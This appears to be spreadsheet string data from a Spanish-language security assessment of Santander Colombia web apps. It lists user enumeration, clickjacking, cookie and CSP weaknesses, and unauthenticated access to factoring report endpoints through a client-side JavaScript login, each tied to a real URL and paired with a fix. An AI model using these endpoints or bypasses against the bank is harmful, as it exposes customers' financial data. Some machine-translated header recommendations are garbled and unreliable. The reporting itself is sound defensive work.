    <t>Es posible obtener los usuarios registrados en la aplicación web en base a los diferentes errores que muestra el aplicativo. Estos errores son diferentes en función de si el usuario introducido es válido o no.
Se pueden obtener estos usuarios en la funcionalidad de login y de recuperación de contraseña.En caso de existir el usuario: la aplicación avanza, enseñando un formulario pidiendo la contraseña o la pregunta de seguridadEn  caso  de  no  existir  el  usuario:  la  aplicación  devuelve  la  misma  página,  añadiendo  el  texto  "La operación no puede ser realizada"</t>
  </si>
  <si>
    <t>QA-WAS-4463c8bb-1185-4832-a52c-17875685cd01</t>
  </si>
  <si>
    <t>X-Frame-Options header is not set</t>
  </si>
  <si>
    <t>El encabezado de X-Frame-Options no está configurado en la respuesta HTTP, lo que puede llevar a un posible enmarcado de la página.
Un atacante puede engañar a los usuarios para que hagan clic en un enlace malicioso enmarcando la página original y mostrando una capa encima de ella con botones de aspecto legítimo.</t>
  </si>
  <si>
    <t>La "X-Frame-Opciones:" permite tres opciones: DENY, SAMEORIGIN y ALLOW-FROM. Se recomienda establecer las "X-FRAME-OPTIONS" en DENY, lo que no permitirá que ningún dominio enmarque el sitio, o SAMEORIGIN, que sólo permite enmarcar el mismo sitio. DENY y SAMEORGIN son soportados por todos los navegadores.
Configurar "X-FRAME-OPTIONS" a  ALLOW-FROM puede dejar a los usuarios vulnerables al Clickjacking ya que no todos los navegadores soportan ALLOW-FROM incluyendo CHROMO y SAFARI.
Para más información, véase https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet.
Para errores más comunes de implementación de X-FRAME-OPTION, por favor visite el siguiente enlace: 
https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger
Traducción realizada con la versión gratuita del traductor www.DeepL.com/Translator</t>
  </si>
  <si>
    <t>Falso positivo</t>
  </si>
  <si>
    <t>QA-WAS-515ad7f7-02c9-4ea1-b291-eef08e19230a</t>
  </si>
  <si>
    <t>QA-WAS-c7549ecb-adf6-4ef5-a7fd-0712159cfffa</t>
  </si>
  <si>
    <t>QA-WAS-d9b87928-ac46-4c02-9a41-fa00b9188bea</t>
  </si>
  <si>
    <t>QA-WAS-bf154f49-1437-4d91-a7b9-a40ca9fe842d</t>
  </si>
  <si>
    <t>QA-WAS-04b81260-93a5-46b5-a536-f9a51f2b23f0</t>
  </si>
  <si>
    <t>QA-WAS-6ed27cf1-7f55-40a3-9bce-6dbb58f38467</t>
  </si>
  <si>
    <t>QA-WAS-a0184b95-d471-4a40-a12e-d30c8f268991</t>
  </si>
  <si>
    <t>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
Referencias:
Inyección maligna de CSS
Ataque de sobrescritura de la ruta relativa
Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobreescritura de ruta relativa.</t>
  </si>
  <si>
    <t>Se recomienda eliminar las URL relativas y utilizar las URL absolutas en las importaciones de CSS.
Las siguientes alternativas pueden aplicarse para evitar las vulnerabilidades de PRSSI.
- Establecer un DOCTYPE que no permita el modo Quirks como se explica en https://hsivonen.fi/doctype/
- Establecer el encabezado de respuesta X-Frame-Opciones: negar
- Ajustar el encabezado de respuesta X-Content-Type-Opciones: olfatear
- Definir una etiqueta base HTML para especificar la URL base para todas las URLs relativas de un documento.</t>
  </si>
  <si>
    <t>QA-WAS-24a43025-c35b-4b26-bb10-336d04f67950</t>
  </si>
  <si>
    <t>Un archivo, directorio o listado de directorio potencialmente sensible fue descubierto en el servidor Web.
https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fApp_Themes%2fadmin%2f</t>
  </si>
  <si>
    <t>QA-WAS-b23d433c-5e0f-4f9a-bb7b-d653c02469cd</t>
  </si>
  <si>
    <t>La "X-Frame-Opciones:" permite tres opciones: DENY, SAMEORIGIN  y ALLOW-FROM. Se recomienda establecer las "X-FRAME-OPTIONS" en DENY, lo que no permitirá que ningún dominio enmarque el sitio, o SAMEORIGIN, que sólo permite enmarcar el mismo sitio. DENY y SAMEORGIN son soportados por todos los navegadores.
Configurar "X-FRAME-OPTIONS" a ALLOW-FROM puede dejar a los usuarios vulnerables al Clickjacking ya que no todos los navegadores soportan PERMITIR-ALTO incluyendo CHROME y SAFARI.</t>
  </si>
  <si>
    <t>QA-WAS-2fe5360d-b673-4bf6-98d9-a17c79915286</t>
  </si>
  <si>
    <t>QA-WAS-5a9e81a8-1747-4a91-9378-1ced8453b45f</t>
  </si>
  <si>
    <t>QA-WAS-2fb3f73a-bbe7-4a11-a057-ef8dd5c60d8b</t>
  </si>
  <si>
    <t>QA-WAS-39c03fee-9d6f-41db-8276-eaa5c2e1779d</t>
  </si>
  <si>
    <t>QA-WAS-b19c0202-d51a-4519-93ff-cf2f2283a5e1</t>
  </si>
  <si>
    <t>QA-WAS-0f055524-3301-4e06-8dc6-afffd618a419</t>
  </si>
  <si>
    <t>QA-WAS-5d0eeea6-1da0-4c38-bdd5-452c6e92fc19</t>
  </si>
  <si>
    <t>QA-WAS-c06625f0-5760-4273-9b0c-c5bb437a4ab2</t>
  </si>
  <si>
    <t>QA-WAS-7417a341-7b15-476a-9a75-519ca7441509</t>
  </si>
  <si>
    <t>helicopterdetect10-3</t>
  </si>
  <si>
    <t>Access control issue in the endpoint /reportes/ReporteAmortizacion.seam</t>
  </si>
  <si>
    <t>High</t>
  </si>
  <si>
    <t>El punto final, /reports/ReporteAmortizacion.seam, revela los informes internos de "Amortizacion". La información revelada incluye:
- Totales de obligación (Totales)
- Identificación de la obligación (Id Obligaciones)
- Fechas de obligación
URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteAmortizacion.seam</t>
  </si>
  <si>
    <t>Aplicar la validación de la autorización y el control de acceso para cada punto final, asegurando que sólo los usuarios con privilegios correctos tengan acceso.</t>
  </si>
  <si>
    <t>Un atacante podría revelar esta información interna.</t>
  </si>
  <si>
    <t>helicopterdetect10-4</t>
  </si>
  <si>
    <t>Access control issues in the endpoints of Intereses reports</t>
  </si>
  <si>
    <t>Estos puntos finales se utilizan para visualizar el interés del cliente por "mora" y "corrientes". Este punto final revela:
- Los nombres de las empresas
- Identificación de la obligación
- Valores de intereses.
URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteInteresesMora.seam
URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteInteresesCorrientes.seam</t>
  </si>
  <si>
    <t>Un atacante podría revelar esta información a terceros.</t>
  </si>
  <si>
    <t>helicopterdetect10-1</t>
  </si>
  <si>
    <t>Captcha Bypass on E-banking online register</t>
  </si>
  <si>
    <t>La solicitud tiene el formulario de registro en línea para asegurarse de que sólo los usuarios legítimos lo soliciten. Hay una implementación de CAPTCHA en el formulario para asegurarse de que sólo los usuarios legítimos pidan esto.
Sin embargo, no es validado en cada solicitud, y un atacante puede ser usado para automatizar la solicitud del formulario para realizar la inundación en la bandeja de entrada del usuario volviendo a emitir la solicitud con el antiguo CAPTCHA.
URL: https://www.santander.com.co/Web/Pages/Requests/RequestServices_Step2.aspx</t>
  </si>
  <si>
    <t>Asegúrate de que el CAPTCHA sea validado en cada solicitud.
Ejemplo::
```
&lt;?xml version="1.0"?&gt;
&lt;!--
 Para más información sobre cómo configurar su aplicación ASP.NET, por favor 
  visite
  http://go.microsoft.com/fwlink/?LinkId=169433
  --&gt;
&lt;configuration&gt;
  &lt;configSections&gt;
    &lt;section name="botDetect" requirePermission="false" 
    type="BotDetect.Configuration.BotDetectConfigurationSection, BotDetect"/&gt;
  &lt;/configSections&gt;
  &lt;appSettings&gt;
    &lt;add key="aspnet:UseTaskFriendlySynchronizationContext" value="true"/&gt;
    &lt;add key="ValidationSettings:UnobtrusiveValidationMode" value="None"/&gt;
  &lt;/appSettings&gt;
  &lt;system.web&gt;
    &lt;httpHandlers&gt;
      &lt;!-- Register the HttpHandler used for BotDetect Captcha requests --&gt;
      &lt;add verb="GET" path="BotDetectCaptcha.ashx" 
      type="BotDetect.Web.CaptchaHandler, BotDetect"/&gt;
    &lt;/httpHandlers&gt;
    &lt;!-- Register a custom SessionIDManager for BotDetect Captcha requests --&gt;
    &lt;sessionState mode="InProc" cookieless="AutoDetect" timeout="20" 
    sessionIDManagerType="BotDetect.Web.CustomSessionIdManager, BotDetect"/&gt;
    &lt;!-- Session state is required for BotDetect storage; you can also turn if off 
    globally and only enable for BotDetect-protected pages if you prefer --&gt;
    &lt;pages controlRenderingCompatibilityVersion="4.5" enableSessionState="true"&gt;
      &lt;controls&gt;
      &lt;!-- Register the BotDetect tag prefix for easier use in all pages --&gt;
      &lt;add assembly="BotDetect" namespace="BotDetect.Web.UI" 
      tagPrefix="BotDetect"/&gt;
      &lt;/controls&gt;
    &lt;/pages&gt;
    &lt;compilation debug="false" targetFramework="4.5"/&gt;
    &lt;httpRuntime requestValidationMode="4.5" targetFramework="4.5" 
    encoderType="System.Web.Security.AntiXss.AntiXssEncoder, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"/&gt;
    &lt;machineKey compatibilityMode="Framework45"/&gt;
  &lt;/system.web&gt;
  &lt;system.webServer&gt;
    &lt;validation validateIntegratedModeConfiguration="false"/&gt;
    &lt;handlers&gt;
      &lt;!-- Register the HttpHandler used for BotDetect Captcha requests (IIS 7.0+) 
      --&gt;
      &lt;remove name="BotDetectCaptchaHandler"/&gt;
      &lt;add name="BotDetectCaptchaHandler" preCondition="integratedMode" verb="GET" 
      path="BotDetectCaptcha.ashx" type="BotDetect.Web.CaptchaHandler, BotDetect"/&gt;
    &lt;/handlers&gt;
  &lt;/system.webServer&gt;
  &lt;botDetect helpLinkEnabled="true" helpLinkMode="image" /&gt;
&lt;/configuration&gt;
```
Reference:
https://captcha.com/doc/aspnet/samples/csharp/asp.net-basic-captcha-sample.html
https://www.c-sharpcorner.com/UploadFile/8a67c0/how-to-create-captcha-image-with-Asp-Net-application/
https://developers.google.com/recaptcha/intro</t>
  </si>
  <si>
    <t>Un atacante puede automatizar la solicitud del formulario para realizar la inundación en la bandeja de entrada del usuario objetivo volviendo a emitir la solicitud con el antiguo CAPTCHA.</t>
  </si>
  <si>
    <t>helicopterdetect10-2</t>
  </si>
  <si>
    <t>Access control issues and Application error disclose users, application paths, and application entity data</t>
  </si>
  <si>
    <t>El backend de la aplicación está sobre Apache, JBoss y JSF (Facelets). Debido a un error en el manejo de los parámetros obtengo un error que revela la siguiente información:
- 107 usuarios (enumeración de cuentas)
- 336 puntos finales de la aplicación (pruebo muchos de estos puntos finales y son vulnerables a los problemas de control de acceso)
- 290 puntos finales de ayuda
Por ejemplo:
## Problema de control de acceso en el punto final /informes/ReporteProyecciónSaldo
Este punto final se utiliza para acceder al informe de proyección de balance (Proyección Saldo). Este punto final revela la compañía, el estado de vencimiento, el tipo de vencimiento, el valor y la fecha de pago.
Los saldos de las empresas son $0 en la página, pero se muestra el valor del saldo.
## Problema de control de acceso en el punto final ReporteDetalleDeudor
Este punto final revela los detalles de un deudor, como:
- tipo de producto
- Orden de Obligación
- Las cuotas hasta la fecha
- Nombre de Countrapart
- Fecha de vencimiento
- Estado
- El papel del cliente
URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteNovedadesObligacionPdf.seam
URL: https://confirming-factoring.santander.com.co/factoring/reportes/tareasPendientes.seam
URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteProyeccionSaldo.seam
URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteDetalleDeudor.seam
URL: https://confirming-factoring.santander.com.co/factoring/reportes/*</t>
  </si>
  <si>
    <t>Reconfigurar jboss para gestionar este tipo de errores y hacer cumplir la validación de la autorización y el control de acceso para cada punto final, asegurando que sólo los usuarios con privilegios correctos tengan acceso.</t>
  </si>
  <si>
    <t>Un atacante podría utilizar los puntos finales revelados para probar cuestiones de control de acceso, obteniendo información confidencial interna (esta información es clave porque la aplicación es vulnerable a estas cuestiones). Además, el uso de los nombres de usuario revelados podría forzar el inicio de sesión de la aplicación porque no tiene fuertes controles relacionados con la fuerza bruta.</t>
  </si>
  <si>
    <t>helicopterdetect10-9</t>
  </si>
  <si>
    <t>Improper reset password implementation reveals account owners full name on password reset page</t>
  </si>
  <si>
    <t>## Detalles
**Título**: La implementación de la contraseña de restablecimiento inadecuada revela el nombre completo de los propietarios de las cuentas en la página de restablecimiento de la contraseña
**Riesgo**: Medio
**Impacto**: Medio
**Explotabilidad**: Alto
## Introducción
Los datos sensibles son toda información que se pretende proteger del acceso no autorizado. Los datos sensibles pueden incluir cualquier cosa, desde información personal identificable (PII), como números de la Seguridad Social, hasta información bancaria o credenciales de acceso. Cuando un atacante accede a estos datos como resultado de una violación de datos, los usuarios corren el riesgo de que los datos sensibles queden expuestos. Las violaciones de datos que dan lugar a la exposición de credenciales sensibles pueden acarrear costos de millones de dólares, destruyendo con ello la reputación de una empresa. 
## Sinopsis
**HELICOPTERDETECT10** permite a los usuarios restablecer sus contraseñas en el punto final de `/factoring/seguridad/preguntasSeguridadUsuario/generarCuestionarioNuevaContrasena.seam`.
Desafortunadamente, la aplicación revela el nombre completo de los propietarios de la cuenta cuando el usuario solicita un restablecimiento de la contraseña para el nombre de usuario dado.
Por ejemplo, cuando usamos "funEH1" como usuario para el restablecimiento de la contraseña, la aplicación revelará el nombre de los propietarios de la cuenta como:
"Hacking Ético Funcional Uno
Mientras que la aplicación encripta el nombre de usuario en cada solicitud para evitar una posible fuerza bruta, la encriptación se realiza en el lado del cliente, lo que podría ser abusado para escribir guiones personalizados y enviar solicitudes sin pasar por la prevención.
Revelar el nombre completo de los propietarios de las cuentas de esta manera traería casos potenciales de abuso como el phishing, así como la violación de la privacidad del usuario.
Por ejemplo, los usuarios pueden elegir utilizar sus apellidos como una de las respuestas secretas y si esa información se revela y se hace una pregunta al azar sobre el apellido de los usuarios, esto podría llevar a restablecer también su contraseña.
## Causa raíz del problema
La aplicación revela el nombre del usuario en el primer paso del restablecimiento de la contraseña cuando los usuarios no verifican la propiedad de la cuenta como si respondieran a una pregunta secreta.
URL: https://confirming-factoring.santander.com.co/factoring/security/preguntasSeguridadUsuario/generarCuestionarioNuevaContrasena.seam</t>
  </si>
  <si>
    <t>La solicitud no debe devolver ninguna información de identificación personal (**PII**) en páginas no autenticadas, haga lo siguiente, como mínimo, y consulte las referencias:
- Clasificar los datos procesados, almacenados o transmitidos por una solicitud. Identificar qué datos son sensibles según las leyes de privacidad, los requisitos reglamentarios o las necesidades comerciales.
- Aplicar controles según la clasificación.
- No almacene datos sensibles innecesariamente. Deséchelos tan pronto como sea posible o utilice el sistema de tokenización o incluso el truncamiento que cumple con el PCI DSS. Los datos que no se retienen no pueden ser robados.
- Asegúrese de encriptar todos los datos sensibles en reposo.
- Asegúrese de que los algoritmos, protocolos y claves estándar actualizados y fuertes estén en su lugar; use el manejo de claves adecuado.
- Cifrar todos los datos en tránsito con protocolos seguros como TLS con cifrado de secreto perfecto de avance (PFS), priorización de cifrado por parte del servidor y parámetros seguros. Aplicar la encriptación utilizando directivas como HTTP Strict Transport Security (HSTS).
- Deshabilitar el almacenamiento en caché para las respuestas que contengan datos sensibles.
- Verificar independientemente la efectividad de la configuración y los ajustes.</t>
  </si>
  <si>
    <t>La exposición de datos sensibles puede causar pérdidas financieras a la organización y al individuo afectado. Aparte de eso, esto puede llevar a un secuestro de identidad y para las organizaciones, esto impactará negativamente en la marca.</t>
  </si>
  <si>
    <t xml:space="preserve">
Encabezados de aplicaciones web
Encabezados ineficaces: Content-Security-Policy</t>
  </si>
  <si>
    <t>Neutral</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Content-Security-Policy: Default-src 'self'; font-src *; img-src </t>
    </r>
    <r>
      <rPr>
        <u/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>* data:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">; script-src </t>
    </r>
    <r>
      <rPr>
        <u/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>* 'unsafe-inline'</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">; style-src </t>
    </r>
    <r>
      <rPr>
        <u/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>* 'unsafe-inline'</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">; frame-src 
https://www.youtube.com/; connect-src https://www.google-analytics.com/
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>font-src:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Los asteriscos en la fuente son inseguros. 
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>img-src:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Los asteriscos en la fuente son inseguros,
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>script-src:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Los asteriscos en la fuente son inseguros,
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>style-src:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Los asteriscos en la fuente son inseguros,
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>plugin-types-objective:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Limitación de privilegios de la aplicación (tipos de complementos).
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>reporting-objective</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: Sin directiva de informes en uso.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>form-action-objective:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Limitación de privilegios de la aplicación (acciones de formulario).
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>code-injection-objective:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Prevención de inyección de código limitado.</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Elimina cualquier instancia de las directivas "inseguras" y la fuente "blob, datos, sistema de archivos". Asegúrate de que las directivas de tu CSP están correctamente configuradas.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>font-src:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Elimine todas las instancias del carácter de asterisco (*) que sean por sí mismas de su política de seguridad de contenido.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>img-src:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> la fuente de "Datos" es insegura. Elimine todas las instancias del carácter de asterisco (*) que sean por sí mismas de su política de seguridad de contenido.
Elimine "datos:" de la lista de fuentes en su política de seguridad de contenido.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>script-src:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> "Inseguro en línea" es inseguro. Elimine todas las instancias del carácter de asterisco (*) que sean por sí mismas de su política de seguridad de contenido.
Elimine la palabra clave "inseguro en línea" de su política de seguridad de contenido.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>style-src:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">  "Inseguro en línea" es inseguro. Elimine todas las instancias del carácter de asterisco (*) que sean por sí mismas de su política de seguridad de contenido.
Elimine la palabra clave "inseguro en línea" de su política de seguridad de contenido.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>plugin-types-objective:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Incluya la directiva de tipos de complementos en su CSP.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>reporting-objective:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">  Incluya una directiva de informes con una ubicación o grupo válido.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>form-action-objective:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Incluya la directiva de acciones de formulario en su CSP.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>code-injection-objective:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">  No utilice ninguna palabra clave "insegura" y utilice hosts explícitos para las directivas de la lista de fuentes.
https://www.w3.org/TR/CSP/</t>
    </r>
  </si>
  <si>
    <t>Realizar el cambio representa un impacto muy grande en el activo y tambien un costo muy elevado, asimismo en Bitsight aparece en estado Good, el cual no afecta la metrica del banco.</t>
  </si>
  <si>
    <t>helicopterdetect10-8</t>
  </si>
  <si>
    <t>Unauthenticated users can bypass login via javascript</t>
  </si>
  <si>
    <t>Este cliente no tiene una API para recuperar datos, todos los datos se construyen en el servidor y se muestran al usuario. La autenticación se maneja localmente a través de JavaScript. 
El cliente valida los controles de acceso a los formularios a través de JavaScript localmente y no en el servidor. Con una simple regla de reemplazo uno podría eludir las restricciones de JavaScript y ver las páginas directamente sin autenticación, por nombrar algunas:
- /reportes/ReporteDesembolso.seam
- /informes/InformeDesembolsosProgramados.seam
- /informes/ReporteDetalleDeudor.seam
- /informes/ReporteRecaudosEsperados.seam
- /basico/gerenteList/GerenteList.seam
- /informes/ReporteInteresesCorrientes.seam
- /informes/InformesInteresesMora.seam
Algunos puntos finales recuperan datos y otros consultan la base de datos.  Cualquier punto final bajo factorización es vulnerable.
URL: https://confirming-factoring.santander.com.co/factoring/reportes/*
URL: https://confirming-factoring.santander.com.co/factoring/*</t>
  </si>
  <si>
    <t>Aplicar la validación de la autorización y el control de acceso para cada punto final, asegurando que sólo tengan acceso los usuarios privilegiados correctos.</t>
  </si>
  <si>
    <t>Los usuarios no autenticados pueden acceder a todos los formularios de solicitud sin usuario/contraseña. Algunas informaciones divulgadas son:
- números de factura
- números de obligación (identificaciones internas)
- El atacante podría filtrar por fecha todos los desembolsos realizados por la compañía
- Tipo de desembolsos
- valor de los desembolsos
- números de obligación (identificaciones internas)
Cualquier punto final bajo factorización es vulnerable.</t>
  </si>
  <si>
    <t>QA-WAS-08cd7585-2ac2-44a5-8260-1c75fa180fac</t>
  </si>
  <si>
    <t>Cookie Does Not Contain The "HTTPOnly" Attribute</t>
  </si>
  <si>
    <t>La cookie no contiene el atributo ;HTTPOnly;.
https://confirming-factoring.santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/framework.pack.js.seam</t>
  </si>
  <si>
    <t>Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo ;HTTPOnlyt; a las cookies.</t>
  </si>
  <si>
    <t>QA-WAS-cd011e8e-eb16-4dc3-be53-2af3cb2ab043</t>
  </si>
  <si>
    <t>Cookie Does Not Contain The "secure" Attribute</t>
  </si>
  <si>
    <t>La cookie no contiene el atributo ;secure;.
https://confirming-factoring.santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/framework.pack.js.seam</t>
  </si>
  <si>
    <t>Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo ;secure; a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS.</t>
  </si>
  <si>
    <t>QA-WAS-0ab48c5e-7ff1-42d7-afd4-9b39cee80aed</t>
  </si>
  <si>
    <t>La cabecera X-Frame-Options no se establece en la respuesta HTTP, lo que puede llevar a un posible framing de la página.
Un atacante puede engañar a los usuarios para que hagan clic en un enlace malicioso enmarcando la página original y mostrando una capa sobre ella con botones de aspecto legítimo.
https://confirming-factoring.santander.com.co/factoring/error.htm?_event_transid=257341446</t>
  </si>
  <si>
    <t>La opción "X-Frame-Options:" permite tres opciones DENY, SAMEORIGIN y ALLOW-FROM. Se recomienda establecer "X-FRAME-OPTIONS a DENY" que no permitirá que ningún dominio enmarque el sitio o SAMEORIGIN que sólo permite el enmarcado por el mismo sitio. Todos los navegadores soportan DENY y SAMEORGIN.
Configurar "X-FRAME-OPTIONS" como ALLOW-FROM puede dejar a los usuarios vulnerables al Clickjacking ya que no todos los navegadores soportan ALLOW-FROM incluyendo CHROME y SAFARI</t>
  </si>
  <si>
    <t>QA-WAS-a934536d-b539-454b-b3af-d8ce5281c57e</t>
  </si>
  <si>
    <t>Session Cookie Does Not Contain the "Secure" Attribute</t>
  </si>
  <si>
    <t>La cookie de sesión no contiene el atributo "secure"
https://confirming-factoring.santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/framework.pack.js.seam</t>
  </si>
  <si>
    <t>Aplique el atributo "seguro" a las cookies de sesión para garantizar que se envíen únicamente a través de HTTPS.</t>
  </si>
  <si>
    <t>QA-WAS-5b5c2d0e-30cb-4f37-932b-92b669bb19bb</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor web.
https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fcommon%2f</t>
  </si>
  <si>
    <t>Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplique controles de acceso a él.</t>
  </si>
  <si>
    <t>QA-WAS-94f199d9-9d91-4534-9b1c-9f6db6dd48dc</t>
  </si>
  <si>
    <t>Clickjacking - Framable Page</t>
  </si>
  <si>
    <t>La página web puede estar enmarcada. Esto significa que los ataques de clickjacking contra los usuarios son posibles.
